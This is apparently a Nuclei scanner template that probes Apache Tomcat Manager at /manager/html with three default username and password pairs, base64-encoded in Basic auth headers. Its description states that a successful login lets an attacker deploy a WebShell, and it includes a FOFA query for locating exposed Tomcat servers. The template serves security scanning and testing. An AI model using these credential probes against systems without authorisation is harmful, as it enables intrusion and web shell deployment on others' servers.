id: tomcat-manager-weak-password

info:
  name: Apache Tomcat Manager 弱口令
  author: god
  severity: high
  description: Tomcat Manager 使用默认或弱口令可登录管理后台部署 WebShell
  metadata:
    fofa-query: app="Apache-Tomcat"
  tags: tomcat,weak-password,brute

http:
- raw:
  - |
    @timeout: 15s
    GET /manager/html HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic dG9tY2F0OnRvbWNhdA==

  max-redirects: 0
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "Tomcat Web Application Manager"
      condition: and

- raw:
  - |
    @timeout: 15s
    GET /manager/html HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic YWRtaW46YWRtaW4=

  max-redirects: 0
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "Tomcat Web Application Manager"
      condition: and

- raw:
  - |
    @timeout: 15s
    GET /manager/html HTTP/1.1
    Host: {{Hostname}}
    Authorization: Basic YWRtaW46MTIzNDU2

  max-redirects: 0
  matchers-condition: and
  matchers:
    - type: word
      part: body
      words:
        - "Tomcat Web Application Manager"
      condition: and
